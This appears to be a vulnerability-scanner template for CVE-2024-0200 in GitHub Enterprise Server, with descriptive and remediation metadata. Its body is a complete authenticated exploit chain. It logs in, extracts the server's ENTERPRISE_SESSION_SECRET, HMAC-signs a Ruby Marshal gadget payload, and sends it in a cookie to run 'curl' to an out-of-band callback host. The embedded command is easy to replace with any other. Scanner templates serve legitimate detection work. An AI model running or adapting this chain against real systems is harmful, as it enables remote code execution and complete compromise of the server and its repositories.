http:
- extractors:
  - internal: true
    json:
    - .[].login
    name: org_name
    part: body
    type: json
  headers:
    Authorization: Basic {{base64('{{username}}' + ':' + '{{password}}')}}
  method: GET
  path:
  - '{{BaseURL}}/api/v3/user/orgs'
- headers:
    Authorization: Basic {{base64('{{username}}' + ':' + '{{password}}')}}
  matchers:
  - part: body
    type: word
    words:
    - '"role": "admin"'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/v3/orgs/{{org_name}}/memberships/{{username}}'
- body: "{\n  \"name\": \"{{randstr}}\"\n}\n"
  headers:
    Authorization: Basic {{base64('{{username}}' + ':' + '{{password}}')}}
    Content-Type: application/json
  matchers:
  - status:
    - 201
    type: status
  method: POST
  path:
  - '{{BaseURL}}/api/v3/orgs/{{org_name}}/repos'
- cookie-reuse: true
  extractors:
  - group: 1
    internal: true
    name: csrf_token
    part: body
    regex:
    - name="authenticity_token" value="(.*?)"
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/login'
- body: 'login={{username}}&password={{password}}&commit=Sign%20in&authenticity_token={{csrf_token}}&

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - status:
    - 302
    type: status
  - part: header
    type: word
    words:
    - _gh_render
  method: POST
  path:
  - '{{BaseURL}}/session'
- extractors:
  - group: 1
    internal: true
    name: ghe_secret
    part: body
    regex:
    - '&quot;ENTERPRISE_SESSION_SECRET&quot;=&gt;&quot;([^"]+?)&quot;'
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - ENTERPRISE_SESSION_SECRET
  method: GET
  path:
  - '{{BaseURL}}/organizations/{{org_name}}/settings/actions/repository_items?page=1&rid_key=nw_fsck'
- headers:
    Cookie: _gh_render={{final_payoad}}
  matchers:
  - status:
    - 500
    type: status
  - part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/'
id: CVE-2024-0200
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:github:enterprise_server:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-0200
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-470
    epss-percentile: 0.98795
    epss-score: 0.74495
  description: 'An unsafe reflection vulnerability was identified in GitHub Enterprise
    Server that could lead to reflection injection. This vulnerability could lead
    to the execution of user-controlled methods and remote code execution. To exploit
    this bug, an actor would need to be logged into an account on the GHES instance
    with the organization owner role. This vulnerability affected all versions of
    GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.8.13, 3.9.8,
    3.10.5, and 3.11.3.

    '
  impact: 'Authenticated attackers with organization owner privileges can exploit
    unsafe reflection to execute arbitrary code remotely, leading to complete compromise
    of the GitHub Enterprise Server instance and potential access to all repositories
    and data.

    '
  metadata:
    fofa-query: app="Github-Enterprise"
    max-request: 7
    product: enterprise_server
    shodan-query:
    - title:"GitHub Enterprise"
    - micro focus dsd
    vendor: github
    verified: true
  name: Github Enterprise Authenticated Remote Code Execution
  reference:
  - https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/
  - https://blog.convisoappsec.com/en/analysis-of-github-enterprise-vulnerabilities-cve-2024-0507-cve-2024-0200/
  - https://docs.github.com/en/enterprise-server@3.10/admin/release-notes#3.10.5
  - https://docs.github.com/en/enterprise-server@3.11/admin/release-notes#3.11.3
  - https://docs.github.com/en/enterprise-server@3.8/admin/release-notes#3.8.13
  remediation: 'Upgrade to GitHub Enterprise Server version 3.8.13, 3.9.8, 3.10.5,
    or 3.11.3 or later.

    '
  severity: critical
  tags: cve,cve2024,rce,github,enterprise,vuln
variables:
  b64_marshal_data: '{{base64(url_decode(marshal_data))}}'
  digest: '{{ (hmac(''sha1'',b64_marshal_data,ghe_secret)) }}'
  final_payoad: '{{ b64_marshal_data + ''--'' + digest}}'
  marshal_data: '%04%08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy%09:%0e@instanceo:%1dAqueduct::Worker::Worker%07:%0b@childI"%026%0199999999;
    {{payload}}%06:%06ET:%0c@loggero:%0bLogger%00:%0c@method:%0fkill_child:%09@varI"%10@kill_child%06;%09T:%10@deprecatoro:%1fActiveSupport::Deprecation%06:%0e@silencedT'
  oast: curl {{interactsh-url}}/?
  padstr: '{{randstr}}'
  password: '{{password}}'
  payload: '{{padding(oast,padstr,300,''suffix'')}}'
  username: '{{username}}'
